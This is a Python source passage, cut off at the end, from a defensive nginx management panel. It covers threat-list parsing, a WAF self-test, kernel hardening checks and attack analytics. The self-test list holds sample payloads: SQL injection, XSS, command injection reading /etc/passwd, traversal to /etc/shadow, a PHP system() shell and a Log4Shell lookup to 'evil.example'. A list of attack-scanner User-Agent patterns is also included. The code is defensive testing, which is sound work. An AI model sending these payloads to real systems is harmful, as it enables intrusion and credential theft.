"""Служба защиты от атак: режим «Под атакой» (вручную и автоматически), списки угроз, журнал атак и счётчики,
самопроверка защиты сайта, оценка защищённости, сетевые настройки ядра."""
from __future__ import annotations

import asyncio
import ipaddress
import json
import logging
import os
import re
import socket
import ssl
import time
import urllib.request
from collections import Counter, deque
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from ..config import settings
from ..models import ProtectionSettings, Site
from . import rules as W
from .nginx import challenge_ready, site_modes

log = logging.getLogger("nm.protection")

KINDS = {"waf": "Фильтр запросов", "modsec": "Глубокая проверка (ModSecurity)", "custom": "Свои правила",
         "threat": "Списки угроз", "fakebot": "Поддельные роботы", "hotlink": "Хотлинкинг",
         "challenge": "Проверка браузера", "honeypot": "Ловушки", "ratelimit": "Ограничение частоты",
         "sni": "Host и SNI не совпадают"}
# Группы правил OWASP CRS (первые три цифры номера) → категории фильтра запросов панели
CRS_GROUPS = {"911": ("protocol", "Недопустимый метод"), "913": ("scanners", "Сканеры"),
              "920": ("protocol", "Нарушение протокола HTTP"), "921": ("protocol", "Атака на протокол (контрабанда, CRLF)"),
              "922": ("protocol", "Атака через multipart"), "930": ("traversal", "Включение локальных файлов (LFI)"),
              "931": ("rfi", "Удалённое включение файлов (RFI)"), "932": ("rce", "Внедрение команд (RCE)"),
              "933": ("php", "Атака на PHP"), "934": ("rce", "Атака на Node.js и другие"),
              "941": ("xss", "Межсайтовый скриптинг (XSS)"), "942": ("sqli", "SQL-инъекция"),
              "943": ("session", "Фиксация сессии"), "944": ("java", "Атака на Java"),
              "200": ("protocol", "Ошибка разбора тела запроса")}
CRS_SKIP = {"949110", "959100", "980130", "980140", "980145", "980170", "949111", "959101"}
ACTIONS = {"blocked": "заблокировано", "detected": "записано", "challenged": "проверка браузера",
           "passed": "проверка пройдена", "banned": "IP заблокирован", "allowed": "пропущено"}
MAX_FEED_BYTES = 40 * 1024 * 1024
MAX_FEED_ENTRIES = 1_500_000


# =============================================================================
#  Списки угроз
# =============================================================================
def _json_nets(obj: Any) -> List[str]:
    """Все строки-подсети в JSON (формат Google/Bing/OpenAI: {"prefixes": [{"ipv4Prefix": …}]})."""
    out: List[str] = []
    stack = [obj]
    while stack:
        o = stack.pop()
        if isinstance(o, dict):
            stack.extend(o.values())
        elif isinstance(o, list):
            stack.extend(o)
        elif isinstance(o, str) and ("." in o or ":" in o) and len(o) < 50 and not any(c in o for c in "TZ- "):
            try:  # «66.249.64.0/27», «2001:4860::/64» и одиночные адреса (DuckDuckGo, Amazon)
                ipaddress.ip_network(o, strict=False)
            except ValueError:
                continue
            out.append(o)
    return out


def parse_feed(text: str) -> Tuple[List[str], int]:
    """Текст списка → нормализованные адреса и подсети (первое слово строки; комментарии # и ;). JSON-файлы
    (диапазоны роботов) — все строки вида «адрес/маска»."""
    out, bad, seen = [], 0, set()
    st = text.lstrip()
    if st[:1] in "{[":
        try:
            text = "\n".join(_json_nets(json.loads(st)))
        except ValueError:
            pass
    for line in text.splitlines():
        line = line.split("#", 1)[0].split(";", 1)[0].strip()
        if not line:
            continue
        tok = line.split()[0].strip(",")
        if "-" in tok and "/" not in tok:  # диапазон «a-b» (DShield пишет начало и конец через пробел)
            tok = tok.split("-")[0]
        try:
            net = ipaddress.ip_network(tok, strict=False)
        except ValueError:
            # DShield: «начало конец маска» — берём начало и маску
            parts = line.split()
            try:
                net = ipaddress.ip_network(f"{parts[0]}/{parts[2]}", strict=False) if len(parts) >= 3 else None
            except (ValueError, IndexError):
                net = None
            if net is None:
                bad += 1
                continue
        if (net.version == 4 and net.prefixlen < 8) or (net.version == 6 and net.prefixlen < 16):
            bad += 1  # слишком широкая сеть — вероятно, ошибка в списке
            continue
        s = str(net.network_address) if net.num_addresses == 1 else str(net)
        if s not in seen:
            seen.add(s)
            out.append(s)
        if len(out) >= MAX_FEED_ENTRIES:
            break
    return out, bad


def feed_error(e: Exception) -> str:
    """Ошибка загрузки списка — коротко и по-русски."""
    import urllib.error
    if isinstance(e, urllib.error.HTTPError):
        return f"сервер ответил {e.code} {e.reason}"
    if isinstance(e, urllib.error.URLError):
        return f"нет связи с сервером списка: {e.reason}"
    if isinstance(e, (socket.timeout, TimeoutError)):
        return "сервер списка не ответил вовремя"
    return str(e)[:300]


def fetch_feed(url: str, timeout: int = 60) -> str:
    if url.startswith("file://"):
        return Path(url[7:]).read_text(encoding="utf-8", errors="replace")
    req = urllib.request.Request(url, headers={"User-Agent": "NginxManager-ThreatFeeds/1.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:  # noqa: S310 — адрес задаёт администратор
        data = r.read(MAX_FEED_BYTES + 1)
    if len(data) > MAX_FEED_BYTES:
        raise ValueError("список больше 40 МБ")
    return data.decode("utf-8", errors="replace")


# =============================================================================
#  Самопроверка: «сырые» HTTP-запросы к nginx на этом сервере
# =============================================================================
# Атаки в теле запроса — их видит только глубокая проверка (ModSecurity + OWASP CRS)
MODSEC_CASES = [
    ("SQL-инъекция в форме", "application/x-www-form-urlencoded", "login=admin&q=1' UNION SELECT password FROM users--"),
    ("XSS в JSON", "application/json", '{"comment": "<script>alert(document.cookie)</script>"}'),
    ("Внедрение команд в форме", "application/x-www-form-urlencoded", "host=127.0.0.1;cat /etc/passwd"),
    ("Обход каталогов в форме", "application/x-www-form-urlencoded", "file=../../../../etc/shadow"),
    ("Внедрение PHP в форме", "application/x-www-form-urlencoded", "x=<?php system($_GET['c']); ?>"),
    ("Log4Shell в JSON", "application/json", '{"user": "${jndi:ldap://evil.example/a}"}'),
]


def raw_request(host: str, port: int, tls: bool, sni: str, method: str, target: str, headers: Dict[str, str],
                timeout: float = 5.0, body: bytes = b"") -> Tuple[Optional[int], Dict[str, str]]:
    """Отправить запрос как есть (без нормализации URL) и прочитать статус. None — соединение закрыто (444)."""
    s = socket.create_connection((host, port), timeout=timeout)
    try:
        if tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=sni)
        lines = [f"{method} {target} HTTP/1.1", f"Host: {sni}", "Connection: close"]
        lines += [f"{k}: {v}" for k, v in headers.items()]
        if body:
            lines.append(f"Content-Length: {len(body)}")
        s.sendall(("\r\n".join(lines) + "\r\n\r\n").encode("utf-8", "surrogateescape") + body)
        buf = b""
        while b"\r\n\r\n" not in buf and len(buf) < 65536:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
        if not buf:
            return None, {}
        head = buf.split(b"\r\n\r\n", 1)[0].decode("latin-1")
        first, *rest = head.split("\r\n")
        m = re.match(r"HTTP/\d(?:\.\d)? (\d{3})", first)
        hdrs = {}
        for ln in rest:
            if ":" in ln:
                k, v = ln.split(":", 1)
                hdrs[k.strip().lower()] = v.strip()
        return (int(m.group(1)) if m else None), hdrs
    except (ConnectionResetError, ssl.SSLError, socket.timeout, BrokenPipeError):
        return None, {}
    finally:
        try:
            s.close()
        except OSError:
            pass


def selftest_cases(level: int) -> List[Dict[str, Any]]:
    """Атаки для самопроверки: по одному примеру каждого правила (поле запроса или заголовок) + обычные запросы."""
    cases = []
    for r in W.RULES:
        if r.level > level or not r.examples:
            continue
        ex = r.examples[0]
        t = r.targets[0]
        case = {"rule": r.id, "cat": r.cat, "title": r.title, "method": "GET", "path": "/", "headers": {},
                "payload": ex, "field": W.TARGETS[t][1]}
        if t == "uri":
            if not ex.startswith("/"):
                continue
            case["path"] = ex
        elif t in ("ua", "ref", "cookie", "xff", "ctype", "xapi", "nextmw", "xmo"):
            hn = {"ua": "User-Agent", "ref": "Referer", "cookie": "Cookie", "xff": "X-Forwarded-For",
                  "ctype": "Content-Type", "xapi": "X-Api-Version", "nextmw": "X-Middleware-Subrequest",
                  "xmo": "X-HTTP-Method-Override"}[t]
            if not ex or "\r" in ex or "\n" in ex:
                continue
            case["headers"][hn] = ex
        elif t == "method":
            case["method"] = ex
        else:
            continue  # протокол/Transfer-Encoding — не проверяем, nginx сам отвечает на такие запросы
        cases.append(case)
    return cases


BENIGN_CASES = ["/", "/search?q=nginx+reverse+proxy", "/catalog?size=42&color=red", "/?q=O%27Reilly",
                "/blog/how-to-select-the-best-union-plan", "/api/v1/users/42?page=2", "/login?next=/account"]


# =============================================================================
#  Сетевые параметры ядра (защита от SYN-флуда и подмены адресов)
# =============================================================================
SYSCTL = [
    ("net.ipv4.tcp_syncookies", "1", "eq", "SYN cookies: ядро отвечает на SYN без выделения памяти — защита от SYN-флуда"),
    ("net.ipv4.tcp_max_syn_backlog", "8192", "ge", "Очередь полуоткрытых соединений"),
    ("net.core.somaxconn", "4096", "ge", "Очередь принятых соединений (nginx listen backlog)"),
    ("net.core.netdev_max_backlog", "16384", "ge", "Очередь пакетов сетевой карты при всплесках"),
    ("net.ipv4.tcp_synack_retries", "2", "le", "Меньше повторов SYN-ACK — быстрее освобождаются полуоткрытые"),
    ("net.ipv4.tcp_fin_timeout", "15", "le", "Быстрее закрывать соединения, брошенные клиентом"),
    ("net.ipv4.tcp_rfc1337", "1", "eq", "Защита от TIME-WAIT assassination (RFC 1337)"),
    ("net.ipv4.conf.all.rp_filter", "1", "in12", "Отбрасывать пакеты с подменённым адресом источника"),
    ("net.ipv4.conf.all.accept_redirects", "0", "eq", "Не принимать ICMP redirect (подмена маршрутов)"),
    ("net.ipv4.conf.all.send_redirects", "0", "eq", "Не отправлять ICMP redirect"),
    ("net.ipv4.conf.all.accept_source_route", "0", "eq", "Не принимать пакеты с маршрутом от источника"),
    ("net.ipv6.conf.all.accept_redirects", "0", "eq", "То же для IPv6"),
    ("net.ipv4.icmp_echo_ignore_broadcasts", "1", "eq", "Не отвечать на широковещательный ping (Smurf)"),
    ("net.ipv4.icmp_ignore_bogus_error_responses", "1", "eq", "Игнорировать поддельные ICMP-ошибки"),
    ("net.ipv4.conf.all.log_martians", "1", "eq", "Записывать в журнал ядра пакеты с невозможными адресами"),
]
SYSCTL_FILE = Path("/etc/sysctl.d/90-nginx-manager.conf")


def sysctl_read(name: str) -> Optional[str]:
    try:
        return Path("/proc/sys/" + name.replace(".", "/")).read_text().strip()
    except OSError:
        return None


def sysctl_ok(cur: Optional[str], want: str, how: str) -> Optional[bool]:
    if cur is None:
        return None
    try:
        c = int(cur.split()[0])
    except ValueError:
        return None
    w = int(want)
    return {"eq": c == w, "ge": c >= w, "le": c <= w, "in12": c in (1, 2)}[how]


def sysctl_report() -> List[Dict[str, Any]]:
    out = []
    for name, want, how, title in SYSCTL:
        cur = sysctl_read(name)
        out.append({"name": name, "current": cur, "recommended": want, "rule": how, "title": title,
                    "ok": sysctl_ok(cur, want, how)})
    return out


# =============================================================================
#  Аналитика защиты
# =============================================================================
# Инструменты атакующих по User-Agent: (ключ, название, регулярное выражение)
TOOLS = [
    ("sqlmap", "sqlmap", r"sqlmap"), ("nuclei", "Nuclei", r"nuclei"), ("nikto", "Nikto", r"nikto"),
    ("wpscan", "WPScan", r"wpscan"), ("zgrab", "ZGrab", r"zgrab"), ("masscan", "masscan", r"masscan"),
    ("nmap", "Nmap", r"nmap"), ("acunetix", "Acunetix", r"acunetix|wvs"), ("burp", "Burp Suite", r"burp"),
    ("zap", "OWASP ZAP", r"\bzap\b|owasp"), ("dirbust", "Перебор путей (gobuster, ffuf, dirsearch…)",
                                             r"gobuster|dirbuster|ffuf|feroxbuster|dirsearch|wfuzz"),
    ("censys", "Censys, Shodan и другие сканеры интернета", r"censys|shodan|internet-measurement|expanse|"
                                                            r"zoomeye|netcraft|leakix|onyphe|binaryedge"),
    ("headless", "Headless-браузер", r"headless|phantomjs|puppeteer|playwright|selenium"),
    ("python", "Python (requests, urllib, aiohttp, httpx)", r"python|aiohttp|httpx|scrapy"),
    ("go", "Go-http-client", r"go-http-client|\bgo/"), ("curl", "curl, wget", r"\bcurl|wget"),
    ("java", "Java, Apache HttpClient, okhttp", r"java/|apache-httpclient|okhttp"),
    ("node", "Node.js (axios, node-fetch)", r"axios|node-fetch|node\.js|undici"),
    ("perl", "Perl, PHP, Ruby", r"libwww-perl|lwp::|php/|guzzle|ruby"),
    ("bot", "Боты и сборщики (bot, crawler, spider)", r"bot\b|bot/|crawler|spider|scraper"),
    ("browser", "Похоже на браузер", r"mozilla/5\.0"),
]
_TOOLS_RE = [(k, t, re.compile(rx, re.I)) for k, t, rx in TOOLS]


def classify_ua(ua: str) -> str:
    if not ua or ua == "-":
        return "empty"
    for k, _t, rx in _TOOLS_RE:
        if rx.search(ua):
            return k
    return "other"


ATTACK_TOOLS = {"sqlmap", "nuclei", "nikto", "wpscan", "zgrab", "masscan", "nmap", "acunetix", "burp", "zap", "dirbust"}
TOOL_TITLES = {k: t for k, t, _ in TOOLS} | {"empty": "Пустой User-Agent", "other": "Прочие"}


def pick_tool(c: Counter) -> str:
    """Главный инструмент по счётчику инструментов адреса: сканер атак важнее скрипта, скрипт — бота и браузера."""
    if not c:
        return "other"
    for group in (ATTACK_TOOLS, None):
        cand = [(n, k) for k, n in c.items() if (k in group if group else k not in ("browser", "bot", "other"))]
        if cand:
            return max(cand)[1]
    return c.most_common(1)[0][0]


def rule_category(kind: str, rule: str) -> str:
    """Категория атаки для аналитики: категория фильтра запросов, группа CRS или сам механизм."""
    if kind == "waf" and "/" in rule:
        return rule.split("/", 1)[0]
    if kind == "modsec":
        return CRS_GROUPS.get(rule.split("/", 1)[-1][:3], ("other", ""))[0]
    return kind


def bucket_step(hours: int) -> int:
    return 300 if hours <= 6 else 1800 if hours <= 48 else 3 * 3600 if hours <= 24 * 8 else 6 * 3600


class ProtectionAnalytics:
    """Отчёты раздела «Защита от атак» по attack_minute (точные счётчики), attack_log (подробные записи,
    во время флуда — выборка) и prot_minute (проверка браузера, роботы)."""

    def __init__(self, svc: "ProtectionService") -> None:
        self.svc = svc
        self.db = svc.db

    def _cond(self, since: float, until: Optional[float] = None, site: str = "", col: str = "ts"):
        cond, args = [f"{col}>=?"], [since]
        if until is not None:
            cond.append(f"{col}<?")
            args.append(until)
        if site:
            cond.append("site=?")
            args.append(site)
        return " AND ".join(cond), args

    def site_names(self) -> Dict[str, str]:
        return {str(r["id"]): r["name"] for r in self.db.query("SELECT id, name FROM sites")}

    def analytics(self, hours: int = 24, site: str = "") -> Dict[str, Any]:
        now = time.time()
        since, prev = now - hours * 3600, now - 2 * hours * 3600
        step = bucket_step(hours)
        cond, args = self._cond(since, site=site)
        pcond, pargs = self._cond(prev, since, site=site)
        acts = ("blocked", "detected", "challenged", "banned")
        tot = {r["action"]: r["n"] for r in self.db.query(
            f"SELECT action, SUM(n) AS n FROM attack_minute WHERE {cond} GROUP BY action", args)}
        ptot = {r["action"]: r["n"] for r in self.db.query(
            f"SELECT action, SUM(n) AS n FROM attack_minute WHERE {pcond} GROUP BY action", pargs)}
        kinds = {r["kind"]: r["n"] for r in self.db.query(
            f"SELECT kind, SUM(n) AS n FROM attack_minute WHERE {cond} GROUP BY kind", args)}
        pkinds = {r["kind"]: r["n"] for r in self.db.query(
            f"SELECT kind, SUM(n) AS n FROM attack_minute WHERE {pcond} GROUP BY kind", pargs)}
        rows = self.db.query(f"SELECT (ts/{step})*{step} AS b, kind, rule, action, site, SUM(n) AS n FROM attack_minute "
                             f"WHERE {cond} GROUP BY b, kind, rule, action, site", args)
        by = {"kind": Counter(), "action": Counter(), "cat": Counter(), "site": Counter()}
        cats, rule_tot, rule_series = Counter(), Counter(), {}
        peak = Counter()
        for r in rows:
            b, n = r["b"], r["n"]
            cat = rule_category(r["kind"], r["rule"])
            by["action"][(b, r["action"])] += n
            if r["action"] in acts:
                by["kind"][(b, r["kind"])] += n
                by["cat"][(b, cat)] += n
                by["site"][(b, r["site"])] += n
                cats[cat] += n
                peak[b] += n
            key = (r["kind"], r["rule"])
            rule_tot[key] += n
            rule_series.setdefault(key, Counter())[b] += n
        series = {k: [{"b": b, "key": key, "n": n} for (b, key), n in sorted(c.items())] for k, c in by.items()}
        tcond, targs = self._cond(since, site=site or "*")
        traffic = {r["b"]: r["n"] for r in self.db.query(
            f"SELECT (ts/{step})*{step} AS b, SUM(req) AS n FROM stats_minute WHERE {tcond} GROUP BY b", targs)}
        total_req = sum(traffic.values())
        lcond, largs = self._cond(since, site=site)
        lcond += " AND test=0"
        uniq = self.db.query(f"SELECT (CAST(ts AS INTEGER)/{step})*{step} AS b, COUNT(DISTINCT ip) AS n FROM attack_log "
                             f"WHERE {lcond} GROUP BY b ORDER BY b", largs)
        uniq_total = (self.db.one(f"SELECT COUNT(DISTINCT ip) AS n FROM attack_log WHERE {lcond}", largs) or {}).get("n", 0)
        pl, pla = self._cond(prev, since, site=site)
        uniq_prev = (self.db.one(f"SELECT COUNT(DISTINCT ip) AS n FROM attack_log WHERE {pl} AND test=0", pla)
                     or {}).get("n", 0)
        # тепловая карта: день недели × час (не меньше недели истории)
        hcond, hargs = self._cond(now - max(hours, 168) * 3600, site=site)
        heat = [[0] * 24 for _ in range(7)]
        for r in self.db.query(f"SELECT (ts/3600)*3600 AS h, SUM(n) AS n FROM attack_minute WHERE {hcond} AND action IN "
                               "('blocked','detected','challenged','banned') GROUP BY h", hargs):
            lt = time.localtime(r["h"])
            heat[lt.tm_wday][lt.tm_hour] += r["n"]
        tools = Counter()
        for r in self.db.query(f"SELECT ua, COUNT(*) AS n FROM attack_log WHERE {lcond} GROUP BY ua "
                               "ORDER BY n DESC LIMIT 2000", largs):
            tools[classify_ua(r["ua"])] += r["n"]
        methods = self.db.query(f"SELECT method AS key, COUNT(*) AS n FROM attack_log WHERE {lcond} GROUP BY method "
                                "ORDER BY n DESC LIMIT 10", largs)
        statuses = self.db.query(f"SELECT status AS key, COUNT(*) AS n FROM attack_log WHERE {lcond} GROUP BY status "
                                 "ORDER BY n DESC LIMIT 12", largs)
        paths = self.db.query(
            f"SELECT CASE WHEN instr(uri,'?')>0 THEN substr(uri,1,instr(uri,'?')-1) ELSE uri END AS key, "
            f"COUNT(*) AS n, COUNT(DISTINCT ip) AS ips FROM attack_log WHERE {lcond} GROUP BY key ORDER BY n DESC "
            "LIMIT 20", largs)
        hosts = self.db.query(f"SELECT host AS key, COUNT(*) AS n FROM attack_log WHERE {lcond} AND host!='' "
                              "GROUP BY host ORDER BY n DESC LIMIT 10", largs)
        countries = self.db.query(f"SELECT country AS key, COUNT(*) AS n, COUNT(DISTINCT ip) AS ips FROM attack_log "
                                  f"WHERE {lcond} AND country!='' GROUP BY country ORDER BY n DESC LIMIT 20", largs)
        rule_ips = {r["rule"]: r["n"] for r in self.db.query(
            f"SELECT rule, COUNT(DISTINCT ip) AS n FROM attack_log WHERE {lcond} GROUP BY rule", largs)}
        rule_meta = {(r["kind"], r["rule"]): r for r in self.db.query(
            f"SELECT kind, rule, MIN(ts) AS first, MAX(ts) AS last, COUNT(DISTINCT site) AS sites, "
            f"SUM(CASE WHEN action='blocked' THEN n ELSE 0 END) AS blocked, "
            f"SUM(CASE WHEN action='detected' THEN n ELSE 0 END) AS detected FROM attack_minute WHERE {cond} "
            "GROUP BY kind, rule", args)}
        top_rules = []
        for (kind, rule), n in rule_tot.most_common(40):
            m = rule_meta.get((kind, rule), {})
            top_rules.append({"kind": kind, "rule": rule, "title": self.svc.rule_title(kind, rule), "n": n,
                              "cat": rule_category(kind, rule), "ips": rule_ips.get(rule, 0),
                              "sites": m.get("sites", 0), "first": m.get("first"), "last": m.get("last"),
                              "blocked": m.get("blocked", 0), "detected": m.get("detected", 0),
                              "spark": [rule_series[(kind, rule)].get(b, 0) for b in
                                        range(int(since // step) * step, int(now) + 1, step)]})
        feeds = Counter()
        for (kind, rule), n in rule_tot.items():
            if kind == "threat":
                feeds[rule.split("/", 1)[-1].split(":")[0]] += n
        feed_names = {f.id: f.name for f in self.svc.settings().threat_feeds}
        rl = Counter({rule.split("/", 1)[-1]: n for (kind, rule), n in rule_tot.items() if kind == "ratelimit"})
        pcd, pca = self._cond(since, site=site)
        ch = {r["key"]: {"n": r["n"], "ms": r["ms"]} for r in self.db.query(
            f"SELECT key, SUM(n) AS n, SUM(ms) AS ms FROM prot_minute WHERE {pcd} AND metric='challenge' GROUP BY key",
            pca)}
        solve = {r["key"]: r["n"] for r in self.db.query(
            f"SELECT key, SUM(n) AS n FROM prot_minute WHERE {pcd} AND metric='solve' GROUP BY key", pca)}
        ch_series = self.db.query(f"SELECT (ts/{step})*{step} AS b, key, SUM(n) AS n FROM prot_minute WHERE {pcd} "
                                  "AND metric='challenge' GROUP BY b, key ORDER BY b", pca)
        bots = Counter()
        for r in self.db.query(f"SELECT key, SUM(n) AS n FROM prot_minute WHERE {pcd} AND metric='bot' GROUP BY key",
                               pca):
            bots[r["key"]] += r["n"]
        bot_names = {b.id: b.name for b in self.svc.settings().verified_bots}
        bot_rows = []
        for bid in sorted({k.split(":")[0] for k in bots}):
            bot_rows.append({"id": bid, "name": bot_names.get(bid, bid), "ok": bots.get(f"{bid}:ok", 0),
                             "fake": bots.get(f"{bid}:fake", 0)})
        periods = self.db.query("SELECT * FROM attack_periods WHERE start>=? OR end IS NULL OR end>=? "
                                "ORDER BY start DESC LIMIT 50", (since, since))
        names = self.site_names()
        for r in periods:
            r["name"] = "все сайты" if r["site"] == "*" else names.get(r["site"], r["site"])
            r["duration"] = (r["end"] or now) - r["start"]
        pk = max(peak.items(), key=lambda x: x[1]) if peak else (None, 0)
        sites = Counter()
        for (b, sid), n in by["site"].items():
            sites[sid] += n
        return {
            "hours": hours, "since": since, "step": step, "now": now,
            "totals": tot, "prev_totals": ptot, "kinds": kinds, "prev_kinds": pkinds,
            "attacks": sum(tot.get(a, 0) for a in acts), "prev_attacks": sum(ptot.get(a, 0) for a in acts),
            "unique_ips": uniq_total, "prev_unique_ips": uniq_prev,
            "series": series, "traffic": [{"b": b, "n": n} for b, n in sorted(traffic.items())],
            "total_requests": total_req, "uniq_series": uniq,
            "peak": {"b": pk[0], "n": pk[1], "per_min": round(pk[1] / (step / 60), 1)},
            "heat": heat, "categories": [{"key": k, "n": n} for k, n in cats.most_common()],
            "tools": [{"key": k, "title": TOOL_TITLES.get(k, k), "n": n} for k, n in tools.most_common()],
            "methods": methods, "statuses": statuses, "paths": paths, "hosts": hosts, "countries": countries,
            "rules": top_rules,
            "feeds": [{"id": k, "name": feed_names.get(k, k), "n": n} for k, n in feeds.most_common()],
            "ratelimit": [{"id": k, "title": self.svc.rule_title("ratelimit", "ratelimit/" + k), "n": n}
                          for k, n in rl.most_common()],
            "challenge": ch, "solve": solve, "challenge_series": ch_series, "bots": bot_rows,
            "periods": periods,
            "sites": [{"site": k, "name": names.get(k, k or "—"), "n": n} for k, n in sites.most_common(20)],
            "kinds_titles": KINDS, "cat_titles": {**{k: v["title"] for k, v in W.CATEGORIES.items()},
                                                  **{k: v for k, v in KINDS.items()},
                                                  "session": "Фиксация сессии", "other": "Прочее"},
        }

    def attackers(self, hours: int = 24, site: str = "", q: str = "", limit: int = 200) -> List[Dict[str, Any]]:
        since = time.time() - hours * 3600
        cond, args = self._cond(since, site=site)
        cond += " AND test=0 AND ip!=''"
        if q:
            cond += " AND (ip LIKE ? OR country=? OR ua LIKE ?)"
            args += [f"%{q}%", q.upper(), f"%{q}%"]
        rows = self.db.query(
            f"SELECT ip, MAX(country) AS country, COUNT(*) AS n, MIN(ts) AS first, MAX(ts) AS last, "
            f"COUNT(DISTINCT rule) AS rules, COUNT(DISTINCT site) AS sites, GROUP_CONCAT(DISTINCT kind) AS kinds, "
            f"SUM(CASE WHEN action='blocked' THEN 1 ELSE 0 END) AS blocked, "
            f"SUM(CASE WHEN action='detected' THEN 1 ELSE 0 END) AS detected, "
            f"SUM(CASE WHEN action='challenged' THEN 1 ELSE 0 END) AS challenged, MAX(ua) AS ua "
            f"FROM attack_log WHERE {cond} GROUP BY ip ORDER BY n DESC LIMIT ?", args + [min(limit, 1000)])
        banned = self._banned()
        # инструмент адреса: самый «опасный» из его User-Agent (сканер атак → скрипт → бот → браузер)
        uas: Dict[str, Counter] = {}
        ips = [r["ip"] for r in rows]
        for i in range(0, len(ips), 500):
            part = ips[i:i + 500]
            for u in self.db.query(f"SELECT ip, ua, COUNT(*) AS n FROM attack_log WHERE {cond} AND ip IN "
                                   f"({','.join('?' * len(part))}) GROUP BY ip, ua", args + part):
                uas.setdefault(u["ip"], Counter())[classify_ua(u["ua"] or "")] += u["n"]
        for r in rows:
            r["tool"] = pick_tool(uas.get(r["ip"], Counter()))
            r["tool_title"] = TOOL_TITLES.get(r["tool"], r["tool"])
            r["tools"] = [TOOL_TITLES.get(k, k) for k, _ in uas.get(r["ip"], Counter()).most_common(4)]
            r["banned"] = r["ip"] in banned
            r["score"] = self.score_ip(r)
        return rows

    @staticmethod
    def score_ip(r: Dict[str, Any]) -> int:
        """Оценка угрозы 0–100: объём, разнообразие правил (сканирование), разные сайты, инструменты атаки."""
        import math
        sc = min(35, round(12 * math.log2((r.get("n") or 0) + 1))) + min(20, (r.get("rules") or 0) * 5) + \
            min(10, max(0, (r.get("sites") or 1) - 1) * 5)
        tool = r.get("tool")
        if tool in ATTACK_TOOLS:
            sc += 30
        elif tool not in ("browser", "other", "bot"):
            sc += 15
        if "honeypot" in (r.get("kinds") or ""):
            sc += 15
        return min(100, sc)

    def _banned(self) -> set:
        try:
            return {r["net"] for r in self.db.query("SELECT net FROM bans WHERE expires_at IS NULL OR expires_at>?",
                                                    (time.time(),))}
        except Exception:  # noqa: BLE001
            return set()

    def ip_profile(self, ip: str, hours: int = 168) -> Dict[str, Any]:
        now = time.time()
        since = now - hours * 3600
        step = bucket_step(hours)
        args = [ip, since]
        base = "ip=? AND ts>=? AND test=0"
        summ = self.db.one(f"SELECT COUNT(*) AS n, MIN(ts) AS first, MAX(ts) AS last, MAX(country) AS country, "
                           f"COUNT(DISTINCT site) AS sites, COUNT(DISTINCT rule) AS rules FROM attack_log WHERE {base}",
                           args) or {}
        ever = self.db.one("SELECT MIN(ts) AS first, COUNT(*) AS n FROM attack_log WHERE ip=? AND test=0", (ip,)) or {}
        series = self.db.query(f"SELECT (CAST(ts AS INTEGER)/{step})*{step} AS b, action, COUNT(*) AS n FROM attack_log "
                               f"WHERE {base} GROUP BY b, action ORDER BY b", args)
        rules = self.db.query(f"SELECT kind, rule, COUNT(*) AS n, MAX(ts) AS last FROM attack_log WHERE {base} "
                              "GROUP BY kind, rule ORDER BY n DESC LIMIT 30", args)
        for r in rules:
            r["title"] = self.svc.rule_title(r["kind"], r["rule"])
        names = self.site_names()
        sites = self.db.query(f"SELECT site, COUNT(*) AS n FROM attack_log WHERE {base} GROUP BY site ORDER BY n DESC",
                              args)
        for r in sites:
            r["name"] = names.get(r["site"], r["site"] or "—")
        uas = self.db.query(f"SELECT ua, COUNT(*) AS n FROM attack_log WHERE {base} GROUP BY ua ORDER BY n DESC "
                            "LIMIT 10", args)
        for r in uas:
            r["tool"] = TOOL_TITLES.get(classify_ua(r["ua"]), "")
        paths = self.db.query(f"SELECT uri, method, status, COUNT(*) AS n FROM attack_log WHERE {base} "
                              "GROUP BY uri, method ORDER BY n DESC LIMIT 25", args)
        events = self.svc.events(limit=50, ip=ip)
        traffic = None
        try:
            t = self.db.one("SELECT COUNT(*) AS n, SUM(CASE WHEN status>=400 THEN 1 ELSE 0 END) AS err FROM requests "
                            "WHERE ip=? AND ts>=?", (ip, since))
            traffic = dict(t) if t else None
        except Exception:  # noqa: BLE001 — журнал запросов может быть выключен
            traffic = None
        ban = None
        try:
            ban = self.db.one("SELECT * FROM bans WHERE net=? AND (expires_at IS NULL OR expires_at>?)", (ip, now))
        except Exception:  # noqa: BLE001
            ban = None
        p = self.svc.settings()
        trusted = any(_in_net(ip, n) for n in p.bypass_ips)
        feeds = self.svc.ip_in_feeds(ip)
        r = {"ip": ip, "hours": hours, "step": step, "since": since, "summary": summ, "ever": ever, "series": series,
             "rules": rules, "sites": sites, "uas": uas, "paths": paths, "events": events, "traffic": traffic,
             "ban": ban, "trusted": trusted, "feeds": feeds}
        r["score"] = self.score_ip({"n": summ.get("n", 0), "rules": summ.get("rules", 0), "sites": summ.get("sites", 0),
                                    "tool": pick_tool(sum((Counter({classify_ua(u["ua"]): u["n"]}) for u in uas),
                                                          Counter())),
                                    "kinds": ",".join(x["kind"] for x in rules)})
        return r

    def insights(self, now: Optional[float] = None) -> List[tuple]:
        """Находки для встроенного анализа: (сценарий, уровень, сайт, сводка, данные, значение, ключ)."""
        now = now or time.time()
        out: List[tuple] = []
        p = self.svc.settings()
        blocked = ('blocked','detected','challenged','banned')
        acts = ",".join(f"'{a}'" for a in blocked)
        names = self.site_names()
        # всплеск атак: последние 15 минут против среднего за сутки
        cur = {r["site"]: r["n"] for r in self.db.query(
            f"SELECT site, SUM(n) AS n FROM attack_minute WHERE ts>=? AND action IN ({acts}) GROUP BY site",
            (now - 900,))}
        day = {r["site"]: r["n"] for r in self.db.query(
            f"SELECT site, SUM(n) AS n FROM attack_minute WHERE ts>=? AND ts<? AND action IN ({acts}) GROUP BY site",
            (now - 86400, now - 900))}
        for sid, n in cur.items():
            base = (day.get(sid, 0) / 95) or 0.0
            if n >= 100 and n >= 5 * base:
                top = self.db.query("SELECT kind, rule, SUM(n) AS n FROM attack_minute WHERE ts>=? AND site=? "
                                    "GROUP BY kind, rule ORDER BY n DESC LIMIT 5", (now - 900, sid))
                out.append(("attack_surge", "crit" if n >= 1000 else "warn", sid or "*",
                            f"{n} атак за 15 минут (обычно ~{base:.0f})",
                            {"columns": ["Правило", "Срабатываний"],
                             "rows": [[self.svc.rule_title(r["kind"], r["rule"]), r["n"]] for r in top]}, n, ""))
        # фильтр в режиме обучения
        det = {r["site"]: r["n"] for r in self.db.query(
